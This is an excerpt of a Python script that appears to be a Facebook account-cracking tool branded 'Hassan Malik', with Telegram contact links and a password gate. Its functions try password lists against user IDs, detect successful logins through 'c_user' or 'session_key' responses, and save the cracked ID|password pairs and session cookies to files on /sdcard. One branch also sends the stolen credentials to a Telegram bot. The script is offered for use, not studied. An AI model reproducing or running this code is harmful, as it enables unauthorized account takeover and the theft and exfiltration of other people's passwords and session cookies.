...
def compare_phone_time():
    try:
        ...
        print(f"ﺄﻄﺧ نضام امن هنا لا تخاف 🙃🤞🏻")
compare_phone_time()
import datetime;now = datetime.date.today();target = datetime.date(2024,9,16)
if now >=target:print("Hassan Malik   Hassan Malik  ﺪﻨﻋ ةﺍﺩﺍ ﻲﻓ كﺍﺮﺘﺷﻻﺍ ﻚﻨﻜﻤﻳ ةﺍﺩﺍ ﻒﻗﻮﺗ ﺪﻨﻋ مﺎﻀﻧ♕Hassan Malik ♕ ")
else:print("هي ادات ملكه")
def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
...
toor=input ('\033[1;94mPassword 🗝' )
jkss='iraq'
if jkss ==toor:
 pas='toor'
 print('  ')
 print("\x1b[38;5;14m  حﺎﺠﻨﺑ ﻞﻴﺠﺴﺗ ﻢﺗ✓         ")
else:
 print('  ')
 print('\x1b[38;5;196m  هههههههههه        ')
...
print('\n\033[1;37m لقد تم تسجيلك بنجاح في الأداة Hassan Malik  ')
...
\x1b[1;36m{+} \x1b[1;32Spam.  \x1b[1;32m: ░▒▓█►─═IRAQ-ME ═─◄█▓▒░
\x1b[1;36m{+} \x1b[1;33m𝙎pam   \x1b[1;33m: \x1b[1;33m Hassan Malik 
\x1b[1;36m{+} \x1b[1;35mHassan Malik  V«1» 🤞🏻🔥  \x1b[1;35m: https://t.me/ABU_HARBA
\x1b[1;35m:https://t.me/Gabimaru1
\x1b[1;35m:https://t.me/u_att
\033[1;33m ━━━━━━━━━━━━━━━━━━━ \033[1;32 \33[1;34m━━━━━━━━━━━━━━━━━━━━               
""")
                               
def linex():
        print('\033[1;37mᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ Hassan Malik  ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ')
def clear():
        os.system('clear')
        print(('\033[92m—'*25)+'\n• Hassan Malik \n'+('—'*25))
        print(logo)
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/Hassan Malik .txt \033[0;97m\n')
        #100010138361148
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [\033[1;32mHassan Malik \033[1;37m] \033[1;37m[\033[1;32m%s\033[1;37m] \033[1;37m[\033[1;32mOK\033[1;37m/\033[1;91mCP\033[1;37m] \033[1;37m[\033[1;32m%s\033[1;37m\033[1;37m] \033[1;37m[\033[1;96m%s%%\033[1;37m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                ...
                                print(f'''حسن تاج
\r{G7}𝙶𝙾𝙾𝙳 ✔	
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ Hassan Malik  ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
•  𝙴𝙼𝙰𝙸𝙻     : {ids}
•  𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : {pas}
 •  كوكيز : {kuki}
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ Hassan Malik  ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
• 𝙱𝚈 : Hassan Malik  - حسن تاج
 •  كوكيز : {kuki}
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ	
				''')
                                statusok = f'''حسن تاج
       𝙶𝙾𝙾𝙳	✔	
	  ᯓᯓᯓᯓᯓ Hassan Malik  ᯓᯓᯓᯓᯓ
		•  𝙴𝙼𝙰𝙸𝙻     : {ids}
		•  𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : {pas}
                •  كوكيز : {kuki}
	  ᯓᯓᯓᯓᯓ Hassan Malik  ᯓᯓᯓᯓᯓ
	    • 𝙱𝚈 : حسن تاج - Hassan Malik 
				...
				'''
                                ...
                                open('/sdcard/Hassan Malik -COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/Hassan Malik -OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
...
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ	
	  ...
	  ᯓᯓᯓᯓᯓ Hassan Malik  ᯓᯓᯓᯓᯓ
	    • 𝙱𝚈 : Hassan Malik  - Hassan Malik 
				...
				'''
                                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                                        open('/sdcard/Hassan Malik -CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [Hassan Malik ] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
	  ...
	  ᯓᯓᯓᯓᯓ Hassan Malik  ᯓᯓᯓᯓᯓ
	   ...
	   •  كوكيز : {kuki}		
				'''
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [Hassan Malik -CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Hassan Malik -CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
...
def api1(ids,names,passlist):
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [Hassan Malik -OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Hassan Malik -OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Hassan Malik -OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/Hassan Malik -COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/Hassan Malik _OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [Hassan Malik -CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Hassan Malik -CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
